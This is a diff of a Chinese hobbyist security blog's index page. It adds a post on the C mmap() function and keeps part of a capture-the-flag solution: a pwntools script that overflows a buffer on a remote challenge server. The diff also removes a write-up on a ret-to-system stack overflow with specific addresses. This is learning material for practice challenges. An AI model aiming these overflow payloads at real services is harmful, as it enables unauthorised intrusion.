@@ -116,7 +116,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">139</span>
+          <span class="site-state-item-count">140</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -152,6 +152,112 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/29/mmap%E5%87%BD%E6%95%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="一个废物捏">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="要roll就莱！我是卡莎！！！">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/04/29/mmap%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">mmap函数</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-04-29 14:18:38 / Modified: 15:37:39" itemprop="dateCreated datePublished" datetime="2021-04-29T14:18:38+08:00">2021-04-29</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>getpagesize()获得分页大小</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offsize)//定义</span><br><span class="line">//说明：mmap()用来将某个文件内容映射到内存中，对该内存区域的存取即是直接对该文件内容的读写</span><br></pre></td></tr></table></figure>
+<table>
+<colgroup>
+<col style="width: 9%">
+<col style="width: 90%">
+</colgroup>
+<thead>
+<tr class="header">
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>start</td>
+<td>指向欲对应的内存起始地址，通常设为NULL，代表让系统自动选定地址，对应成功后该地址会返回。</td>
+</tr>
+<tr class="even">
+<td>length</td>
+<td>代表将文件中多大的部分对应到内存。</td>
+</tr>
+<tr class="odd">
+<td>prot</td>
+<td>代表映射区域的保护方式，有下列组合：1.PROT_EXEC 映射区域可被执行；2.PROT_READ 映射区域可被读取； PROT_WRITE 映射区域可被写入；3.PROT_NONE 映射区域不能存取。</td>
+</tr>
+<tr class="even">
+<td>flags</td>
+<td>会影响映射区域的各种特性： MAP_FIXED 如果参数 start 所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此旗标。 MAP_SHARED 对应射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。 MAP_PRIVATE 对应射区域的写入操作会产生一个映射文件的复制，即私人的"写入时复制" (copy on write)对此区域作的任何修改都不会写回原来的文件内容。 MAP_ANONYMOUS 建立匿名映射，此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。 MAP_DENYWRITE 只允许对应射区域的写入操作，其他对文件直接写入的操作将会被拒绝。 MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换(swap)。 在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。</td>
+</tr>
+<tr class="odd">
+<td>fd</td>
+<td>open()返回的文件描述词，代表欲映射到内存的文件。</td>
+</tr>
+<tr class="even">
+<td>offset</td>
+<td>文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。</td>
+</tr>
+</tbody>
+</table>
+<p>返回值：若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(-1)，错误原因存于errno 中。</p>
+<p>错误代码： - EBADF 参数fd 不是有效的文件描述词。 - EACCES 存取权限有误。如果是MAP_PRIVATE 情况下文件必须可读，使用MAP_SHARED 则要有PROT_WRITE 以及该文件要能写入。 - EINVAL 参数start、length 或offset 有一个不合法。 - EAGAIN 文件被锁住，或是有太多内存被锁住。 - ENOMEM 内存不足。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1305,85 +1411,6 @@ p16()----2个字节</p>
 <p>第一种方法nc服务器，输入0x24个a，也就是36个a，答题，得到flag</p>
 <p>第二种方法是使用脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">47746</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your name:&quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">ans=[<span class="number">5</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">	io.recvuntil(<span class="string">&quot;Please input your guess number:&quot;</span>)</span><br><span class="line">	io.sendline(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/14/AD-level2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="一个废物捏">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="要roll就莱！我是卡莎！！！">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/03/14/AD-level2/" class="post-title-link" itemprop="url">AD_level2</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-03-14 12:52:34" itemprop="dateCreated datePublished" datetime="2021-03-14T12:52:34+08:00">2021-03-14</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-03-16 00:47:01" itemprop="dateModified" datetime="2021-03-16T00:47:01+08:00">2021-03-16</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>庆祝第一次自己找到漏洞</p>
-<img src="/2021/03/14/AD-level2/1.png" class>
-<p>buf的大小为0x88，但却能读入0x100，造成了溢出</p>
-<p>​ <img src="/2021/03/14/AD-level2/2.png" class> ​ 敏感函数system的地址：0x08048320 ​ <code>_system</code>函数里面有system(command)</p>
-<img src="/2021/03/14/AD-level2/3.png" class>
-<p>关键字符串的地址：0x0804A024</p>
-<p>在32位程序运行中，函数参数直接压入栈中。 调用函数时栈的结构为：1调用<strong>函数地址</strong>，2调用<strong>函数返回地址</strong>，参数n，参数n-1，参数。。。</p>
-<p>用0x88个字符覆盖栈，在用0x04个字符覆盖ebp的地址，将返回地址覆写为system函数。 根据调用函数时栈的结构，system函数需要返回地址，故写入0x04个字符作为虚假的返回地址（不起作用），在写入bin_sh命令作为system的参数。 关键在于，弄清system函数的底层结构。</p>
-<img src="/2021/03/14/AD-level2/1.jpg" class>
 
       
     </div>
